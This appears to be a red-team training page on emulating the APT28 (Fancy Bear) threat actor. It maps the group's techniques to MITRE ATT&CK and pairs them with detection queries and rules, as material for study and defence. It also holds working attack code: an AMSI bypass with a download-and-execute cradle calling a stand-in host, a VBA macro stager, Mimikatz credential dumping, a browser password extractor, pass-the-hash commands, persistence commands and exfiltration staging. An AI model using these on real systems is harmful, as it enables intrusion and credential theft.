---
layout: training-page
title: "APT28 (Fancy Bear) Emulation — Red Team Academy"
module: "Threat Actor Emulation"
tags:
  - apt28
  - fancy-bear
  - gru
  - russia
  - espionage
  - threat-emulation
page_key: "threat-actors-apt28"
render_with_liquid: false
---

# APT28 (Fancy Bear) Emulation

APT28, also known as Fancy Bear, Sofacy, STRONTIUM (Microsoft), and Iron Twilight, is one of the most prolific and technically capable nation-state threat actors. Their operations have shaped modern cybersecurity practice — from the DNC breach in 2016 to the targeting of Olympic anti-doping agencies.

## Attribution

| Attribute | Detail |
|---|---|
| Nation-state | Russian Federation |
| Organization | GRU (Главное разведывательное управление — Main Intelligence Directorate) |
| Unit 26165 | Cyber espionage — responsible for spearphishing campaigns, tool development |
| Unit 74455 | Sandworm — destructive operations (see sandworm.md) — distinct from APT28 |
| MITRE Group ID | G0007 |
| Common aliases | Fancy Bear, Sofacy, STRONTIUM, Iron Twilight, Pawn Storm, Sednit, Tsar Team |
| Active since | ~2004 |
| DOJ indictment | US v. Netyksho et al. (2018) — 12 GRU officers named |

**Key distinction:** APT28 (Unit 26165) conducts espionage and information operations. Sandworm (Unit 74455) conducts destructive attacks. They share infrastructure but have different mandates. This page covers APT28/26165.

## Targeting Profile

**Primary sectors:**
- NATO governments and military organizations
- Defense contractors and aerospace
- Political parties and election infrastructure (US DNC 2016, Macron 2017, German Bundestag 2015)
- Think tanks and NGOs (German Marshall Fund, Hudson Institute)
- International sports organizations (WADA, Olympics doping investigations)
- Energy sector (critical infrastructure pre-positioning)
- Journalists and media organizations covering Russia

**Geographic focus:** US, UK, France, Germany, Ukraine, Eastern Europe, NATO member states

**Motivation:** Military/geopolitical intelligence collection; support for Russian active measures and disinformation campaigns; strategic intelligence for GRU decision-makers

## Initial Access TTPs

### T1566.001 — Spearphishing Attachment

APT28 is known for highly targeted spearphishing with contextually relevant lure documents. Common lures:
- NATO policy documents (PDF/DOCX with weaponized content)
- International political events (Olympics, elections, summits)
- Military exercise briefings

**CVE-2023-38831 (WinRAR RCE):** APT28 exploited this 2023 vulnerability extensively. When a target double-clicks an archive with a crafted `.rar` file containing a space in the filename, WinRAR executes a malicious script. Used against European defense and government targets.

```python
# Detection query (SIEM): WinRAR spawning unexpected child processes
# Event: process_create where parent_image ends with "WinRAR.exe"
# and child_image NOT IN ('WinRAR.exe', 'unrar.exe', ...)
# Sigma rule: proc_creation_win_winrar_susp_child_process.yml
```

### T1190 — Exploitation of Internet-Facing Applications

- **Exchange ProxyLogon (CVE-2021-26855, 2021-27065)** — APT28 exploited Microsoft Exchange ProxyLogon within days of disclosure. Dropped webshells (LETSGO, SBEAM) for persistent access.
- **Cisco IOS (CVE-2023-20269)** — exploited for initial access to government networks

**ProxyLogon detection:**
```powershell
# Hunt for Exchange ProxyLogon webshell drops
Get-ChildItem "C:\inetpub\wwwroot\aspnet_client\" -Recurse |
    Where-Object { $_.Extension -eq '.aspx' -and $_.LastWriteTime -gt (Get-Date).AddDays(-30) }

# Check IIS logs for SSRF patterns (ProxyLogon)
Select-String -Path "C:\inetpub\logs\LogFiles\W3SVC1\*.log" `
    -Pattern "autodiscover\.json.*@.*\/mapi"
```

### T1566.002 — Spearphishing Link: Credential Phishing

APT28 operates extensive credential phishing infrastructure mimicking Microsoft, Google, webmail, and VPN portals. Targets receive emails with links to convincing phishing pages.

**ROOTSAW downloader / OCEANMAP:** Used in 2023 campaigns against European governments — delivers via credential phishing to steal OAuth tokens.

## Execution

### T1059.001 — PowerShell

```powershell
# APT28-style PowerShell download cradle (observed pattern)
# Bypasses AMSI via reflection patching before downloading implant

$a=[Ref].Assembly.GetTypes()
Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}}
$f.SetValue($null,[IntPtr]32)  # AMSI bypass via Context=32

# Download and execute implant
IEX (New-Object Net.WebClient).DownloadString('https://update.windows-update-cdn.example/update.ps1')
```

### T1059.005 — VBA Macro Execution

APT28 weaponizes Office documents with VBA macros. Modern campaigns use XLL add-ins or Excel 4.0 macros to bypass macro warnings in newer Office versions.

```vba
' APT28-style VBA stager (simplified concept)
' Executes PowerShell to download and run the next stage
Private Sub Document_Open()
    Dim proc As Object
    Set proc = CreateObject("WScript.Shell")
    proc.Run "powershell -w hidden -enc " & Base64EncodeStager(), 0, False
End Sub

Function Base64EncodeStager() As String
    ' In actual campaigns: base64-encoded download cradle
    Base64EncodeStager = "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA..."
End Function
```

### T1218 — LOLBINs (Signed Binary Proxy Execution)

APT28 uses legitimate Windows binaries to execute malicious content:
- `mshta.exe` — executes HTA applications
- `regsvr32.exe` — "squiblydoo" technique, COM scriptlet execution
- `certutil.exe` — downloads files: `certutil -urlcache -split -f http://... payload.exe`
- `wscript.exe / cscript.exe` — executes VBScript/JScript

## Persistence

### T1053.005 — Scheduled Tasks

```cmd
:: APT28 persistence via scheduled task
:: Observed in multiple campaigns: task named to mimic system maintenance
schtasks /create /tn "Microsoft\Windows\Maintenance\WindowsDefenderUpdate" ^
    /tr "C:\ProgramData\Microsoft\Windows\Defender\Logs\mscorsvw.exe" ^
    /sc ONLOGON /ru "System" /f

:: Detection: Sysmon Event 1 with parent=schtasks.exe
:: SIGMA: proc_creation_win_schtasks_susp_parent_process.yml
```

### T1547.001 — Registry Run Keys

```powershell
# APT28-observed: HKCU Run key using LOLBINs or DLL side-loading paths
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "OneDriveUpdate" `
    -Value "C:\Users\$env:USERNAME\AppData\Roaming\OneDriveHelper\mscorsvc.exe" `
    -PropertyType String -Force

# Detection: Sysmon Event 13 (Registry value set) for Run keys
# SIGMA: registry_event_persistence_registry_run_keys.yml
```

## Credential Access

### T1003.001 — LSASS Memory Dump (Mimikatz)

APT28 uses Mimikatz in many campaigns, often loaded reflectively to avoid disk artifacts:

```powershell
# Mimikatz via Invoke-Mimikatz (PowerSploit)
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://c2/mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Or via task scheduler to run as SYSTEM:
# Mimikatz loaded by a SYSTEM-privileged process avoids some EDR LSASS protections
```

**Detection:** LSASS access with `PROCESS_VM_READ` rights from non-system processes. Windows Defender Credential Guard prevents LSASS dumps on enabled systems. Sysmon Event 10 (ProcessAccess) targeting `lsass.exe`.

### T1555.003 — Credentials from Web Browsers

APT28's `X-Agent` and custom tools extract credentials from browser password stores:

```python
# APT28-style browser credential extraction (educational — matches actor technique)
# Targets Chrome's Local State (AES encryption key) and Login Data SQLite DB
import sqlite3, os, json, base64, shutil

def get_chrome_creds():
    chrome_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data')
    local_state  = json.load(open(os.path.join(chrome_path, 'Local State')))
    enc_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
    # Decrypt enc_key with DPAPI (CryptUnprotectData), then use as AES key
    # for each entry in Default/Login Data
    db_path = os.path.join(chrome_path, 'Default', 'Login Data')
    tmp_db  = os.path.join(os.environ['TEMP'], 'login_tmp.db')
    shutil.copy(db_path, tmp_db)
    conn = sqlite3.connect(tmp_db)
    for row in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
        print(f"URL: {row[0]}, User: {row[1]}")  # password decryption requires DPAPI key
    conn.close()
```

## Lateral Movement

### T1550.002 — Pass-the-Hash (PtH)

```cmd
:: APT28 PtH using Mimikatz sekurlsa::pth
:: Move laterally with NTLM hash — no password needed
mimikatz.exe "sekurlsa::pth /user:administrator /domain:corp.example.com /ntlm:HASH_HERE /run:cmd.exe" exit

:: Alternative: Impacket wmiexec.py from Linux
python3 wmiexec.py -hashes :NTLM_HASH administrator@192.168.1.10
```

### T1550.003 — Pass-the-Ticket (PtT)

```powershell
# Kerberos ticket manipulation — common in APT28 AD attacks
# Dump tickets from memory
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Inject harvested ticket (from another session)
Invoke-Mimikatz -Command '"kerberos::ptt administrator@corp.example.com.kirbi"'

# Verify: klist should show injected ticket
klist
```

## Command and Control

### CHOPSTICK / X-Agent

APT28's primary implant family, attributed in US DOJ indictments. Key characteristics:
- Custom binary C2 protocol (not HTTP-based in all variants)
- Modular architecture: keylogger module, file stealer, screen capture
- Strong encryption (RC4 or custom scheme) for C2 communications
- Command-line interface for operator interaction

**Detection signatures (YARA rule concept):**
```
rule APT28_XAgent {
    strings:
        $s1 = "sofacy" wide ascii nocase
        $s2 = { 58 2D 41 67 65 6E 74 }  // "X-Agent"
        $s3 = "xagent" wide ascii nocase
        $s4 = { E8 ?? ?? ?? ?? 83 C4 04 8B 45 ?? 89 45 }  // common packer pattern
    condition:
        2 of them
}
```

### Zebrocy

A later-generation downloader/backdoor used alongside CHOPSTICK. Notable for being written in multiple languages (Delphi, AutoIT, C#, Go, Python) — likely separate development cells reusing the same concept.

**Zebrocy initial access chain (2018-2021):**
1. Spearphishing with `.zip` containing `.docx` with macro
2. Macro executes Zebrocy downloader (Delphi binary)
3. Zebrocy beacons to C2, downloads CHOPSTICK
4. CHOPSTICK establishes persistent C2 channel

### Domain-Fronted HTTPS

APT28 uses domain fronting — routing C2 traffic through CDN providers (Cloudflare, Azure CDN, AWS CloudFront) where the SNI hostname in TLS is a legitimate CDN domain, but the `Host` header redirects to the actual C2 server.

```
TLS handshake: SNI = "microsoft.com.edgekey.net"   ← legitimate CDN host
HTTP request:  Host: attacker-c2.example            ← actual C2
CDN forwards to attacker C2 server
```

Detection: CDN providers mostly mitigated domain fronting (2018-2019). APT28 adapted to use other legitimate cloud services.

## Exfiltration

### T1560.001 — Archive Collected Data

```powershell
# APT28 observed exfiltration staging: compress with 7zip, password protect
# Found in DNC breach forensics
& "C:\Program Files\7-Zip\7z.exe" a -p"S3cr3tPass!" `
    -r "C:\Users\Public\Documents\backup_2024.7z" `
    "C:\Users\target\Documents\*"

# Upload to attacker-controlled OneDrive or Google Drive (T1567.002)
# APT28 abuses legitimate cloud storage to blend exfil with normal traffic
```

### T1567.002 — Exfil to Cloud Storage

APT28 frequently stages collected data in OneDrive, Google Drive, or Dropbox accounts controlled by the attacker. This blends with legitimate cloud sync traffic and bypasses controls that only block known bad IPs.

## APT28 Emulation Plan: Sequential TTP Chain

```
PHASE 1: Initial Access
  Day 0-1: Spearphishing via weaponized DOCX (CVE-2023-38831 or VBA macro)
  Tool: maldoc_builder.py or open-source macro builder
  Objective: Code execution on target workstation

PHASE 2: Execution & Staging
  T1059.001: PowerShell AMSI bypass + download cradle
  T1218.010: Regsvr32 COM scriptlet execution
  Tool: custom C2 beacon (mimicking CHOPSTICK HTTP pattern)

PHASE 3: Persistence
  T1053.005: Scheduled task named "WindowsDefenderUpdate"
  T1547.001: HKCU Run key pointing to implant

PHASE 4: Credential Access
  T1003.001: Mimikatz LSASS dump via reflective loading
  T1555.003: Browser credential extraction

PHASE 5: Lateral Movement
  T1550.002: Pass-the-Hash to admin workstations
  T1550.003: Pass-the-Ticket after Kerberoasting

PHASE 6: Collection
  T1056.001: Keylogging via implant module
  T1074.001: Stage collected data in %TEMP%\svchost_logs\

PHASE 7: Exfiltration
  T1560.001: 7-zip compress with password
  T1567.002: Upload to attacker-controlled OneDrive account
  T1071.001: C2 over HTTPS (domain-fronted)
```

## Detection Coverage Matrix

| TTP | ATT&CK ID | Detection Source | Sigma/Alert |
|---|---|---|---|
| Macro execution | T1059.005 | Endpoint (process create) | office_spawning_powershell |
| AMSI bypass | T1562.001 | EDR memory scan | amsi_patch_reflection |
| Mimikatz LSASS | T1003.001 | Sysmon Event 10 | lsass_process_access |
| Scheduled task | T1053.005 | Sysmon Event 1 | schtasks_susp_location |
| Browser creds | T1555.003 | File access monitoring | chrome_logindata_access |
| PtH via Mimikatz | T1550.002 | Windows Event 4624 type 3 | ntlm_logon_susp |
| 7zip staging | T1560.001 | File monitoring | 7zip_password_encrypted |
| Cloud exfil | T1567.002 | Proxy logs | upload_to_cloud_storage |

## References

- MITRE ATT&CK G0007 (APT28): attack.mitre.org/groups/G0007/
- US DOJ Indictment (2018): justice.gov/opa/pr/grand-jury-indicts-12-russian-intelligence-officers
- NSA/CISA/FBI Advisory AA20-296B: cisa.gov
- CrowdStrike "Bears in the Midst" report (2016)
- Mandiant APT28: A Window into Russia's Cyber Espionage Operations
- ESET Research: Operation Fancy Bear targeting sports anti-doping
